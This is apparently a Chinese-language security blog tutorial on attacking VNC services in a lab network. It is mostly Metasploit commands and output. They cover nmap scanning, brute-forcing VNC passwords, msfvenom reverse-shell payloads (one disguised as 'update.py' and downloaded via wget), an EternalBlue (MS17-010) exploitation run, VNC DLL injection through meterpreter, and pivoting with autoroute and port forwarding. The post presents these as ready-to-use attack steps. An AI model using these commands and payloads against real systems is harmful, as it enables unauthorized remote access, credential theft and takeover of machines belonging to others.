---
title: VNC攻击
layout: post
tags:
  - sec
  - hack
  - vnc
category: 
  - hack
  - sec
comments: true
share: true
description: VNC攻击的一些手法
---

* TOC
{:toc}

VNC攻击的一些手法

<!--more-->


## 安装

安装vncserver:

```
sudo apt-get install vnc4server
```

![](/img/hack/vnc/1507626530238.png)

![](/img/hack/vnc/1507626487372.png)


设置vncserver密码：

```
sudo vncpasswd
```

![](/img/hack/vnc/1507626385840.png)


设置vnc连接时窗口的大小：

```javascript
b404@ubuntu:~$ sudo vncserver :1 -geometry 1024x768 -depth 24
```

![](/img/hack/vnc/1507627960004.png)


查看vnc激活状态：

```javascript
sudo netstat -tnl | grep 5901
```

![](/img/hack/vnc/1507628114972.png)


windows连接vnc服务器：



![](/img/hack/vnc/1507710534427.png)



![](/img/hack/vnc/1507628160175.png)


## 扫描目标IP

扫描目标：

```javascript
msf > db_nmap -sT 192.168.222.147
```

![](/img/hack/vnc/1507710932135.png)

查看vnc信息：

```javascript
nmap -p 5901 -script vnc-info 192.168.222.147
```

![](/img/hack/vnc/1507710989291.png)


## 暴力破解

使用msf的vnc爆破模块进行爆破：

```javascript
msf > use auxiliary/scanner/vnc/vnc_login 

msf auxiliary(vnc_login) > set RHOSTS 192.168.222.147
RHOSTS => 192.168.222.147

msf auxiliary(vnc_login) > set RPORT 5901
RPORT => 5901

msf auxiliary(vnc_login) > set pass_file /root/Desktop/pass.txt
pass_file => /root/Desktop/pass.txt

msf auxiliary(vnc_login) > run

```

![](/img/hack/vnc/1507711551761.png)


使用字典爆破成功，密码为213213,进行登陆连接：

```javascript
vncviewer 192.168.222.147:5901
```
 
 ![](/img/hack/vnc/1507711697375.png)

##  利用VNC Payload攻击

使用msfvenom生成vnc payload

```javascript
msfvenom -p windows/vncinject/reverse_tcp lhost=192.168.222.146 lport=44455 -f exe > /var/www/html/vnc.exe
```

启动msf，使用exploit模块中的监听：

```javascript
msf > use exploit/multi/handler
 
msf exploit(handler) > set payload windows/vncinject/reverse_tcp
payload => windows/vncinject/reverse_tcp

msf exploit(handler) > set lhost 192.168.222.146
lhost => 192.168.222.146

msf exploit(handler) > set lport 44455
lport => 44455

msf exploit(handler) > set viewonly false
viewonly => false
msf exploit(handler) > run
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.222.146:44455 

```


![](/img/hack/vnc/1507712752558.png)

当vnc.exe该payload在目标机器上运行的时候，监听启动，并打开vncviewer：

![](/img/hack/vnc/1507713019626.png)


##  通过meterpreter获取VNC会话

通过以下命令扫描目标机器是否有永恒之蓝漏洞：

```javascript
msf > use auxiliary/scanner/smb/smb_ms17_010 
msf auxiliary(smb_ms17_010) > set RHOSTS 192.168.222.136
RHOSTS => 192.168.222.136
msf auxiliary(smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CHECK_DOPU  true             yes       Check for DOUBLEPULSAR on vulnerable hosts
   RHOSTS      192.168.222.136  yes       The target address range or CIDR identifier
   RPORT       445              yes       The SMB service port (TCP)
   SMBDomain   .                no        The Windows domain to use for authentication
   SMBPass                      no        The password for the specified username
   SMBUser                      no        The username to authenticate as
   THREADS     1                yes       The number of concurrent threads

msf auxiliary(smb_ms17_010) > run

```

![](/img/hack/vnc/1507780072548.png)

当扫描出具有永恒之蓝漏洞的时候，通过msf的攻击模块攻击：

```javascript
msf auxiliary(smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
 
msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

sf exploit(ms17_010_eternalblue) > set RHOST 192.168.222.136
RHOST => 192.168.222.136

msf exploit(ms17_010_eternalblue) > set LHOST 192.168.222.146
LHOST => 192.168.222.146

msf exploit(ms17_010_eternalblue) > run
```

![](/img/hack/vnc/1507780255664.png)


![](/img/hack/vnc/1507780397671.png)


当通过反向连接获得meterpreter时候，可以通过`run vnc`分段注入VNC DLL：

![](/img/hack/vnc/1507780443046.png)


## 通过ssh实现VNC攻击

### 搭建环境

![攻击拓扑图](/img/hack/vnc/拓扑图.png)

设置静态IP：

```javascript
sudo vim /etc/network/interfaces
```

![](/img/hack/vnc/1507862243200.png)

![](/img/hack/vnc/1507862331574.png)

配置好，测试ping通与否：

![](/img/hack/vnc/1507862813841.png)

![](/img/hack/vnc/1507862833799.png)

使用putty进行ssh端口转发，连接vnc：



![](/img/hack/vnc/1507880420564.png)


![](/img/hack/vnc/1507880484971.png)

连接vnc成功：


![](/img/hack/vnc/1507880088466.png)


### 使用msfvenom攻击Linux

使用msfvenom生成payload：

```javascript
root@kali:~# msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.222.146 lport=555 > /root/Desktop/update.py
```

![](/img/hack/vnc/1508116773496.png)

开启apache2服务，将update.py放置于web容器中，模拟用户下载攻击：

```
wget http://192.168.222.146/update.py
```


使用msfvenom打开监听：

```javascript
msf > use exploit/multi/handler 
msf exploit(handler) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.222.146
LHOST => 192.168.222.146
msf exploit(handler) > set LPORT 555
LPORT => 555
msf exploit(handler) > exploit
```

![](/img/hack/vnc/1508117032476.png)

![](/img/hack/vnc/1508117124884.png)

查看网卡：

![](/img/hack/vnc/1508117348251.png)

### 基于meterpreter下的vnc攻击

**添加路由**,使得攻击机和被攻击机处于同一网网段：

```javascript
msf exploit(handler) > use post/multi/manage/autoroute 
msf post(autoroute) > set session 1
session => 1
msf post(autoroute) > exploit 
```

![](/img/hack/vnc/1508137801659.png)


**ARP扫描：**

```javascript
msf auxiliary(tcp) > use auxiliary/scanner/discovery/arp_sweep
```

![](/img/hack/vnc/1508138752884.png)


**TCP端口扫描：**

```javascript
use auxiliary/scanner/portscan/tcp 

set rhosts 10.0.0.20

set threads 10

exploit
```

![](/img/hack/vnc/1508138003767.png)

**爆破VNC：**

```javascript
msf auxiliary(tcp) > use auxiliary/scanner/vnc/vnc_login 

msf auxiliary(vnc_login) > set rhosts 10.0.0.20
rhosts => 10.0.0.20

msf auxiliary(vnc_login) > set RPORT 5901
RPORT => 5901

msf auxiliary(vnc_login) > set PASS_FILE /root/Desktop/pass.txt
PASS_FILE => /root/Desktop/pass.txt
msf auxiliary(vnc_login) > run
```

![](/img/hack/vnc/1508138135594.png)

爆破出密码为`213213`，**端口转发：**


```javascript
meterpreter > portfwd add -l 6000 -p 5901 -r 10.0.0.20
```

> -l :本地监听端口
>  
> -p :要连接的远程端口
>  
>  -r：要连接的远程主机地址

![](/img/hack/vnc/1508138469954.png)





refer：
- https://websistent.com/how-to-use-putty-to-create-a-ssh-tunnel/
- http://www.hackingarticles.in/vnc-tunneling-ssh/
- http://www.hackingarticles.in/vnc-pivoting-meterpreter/



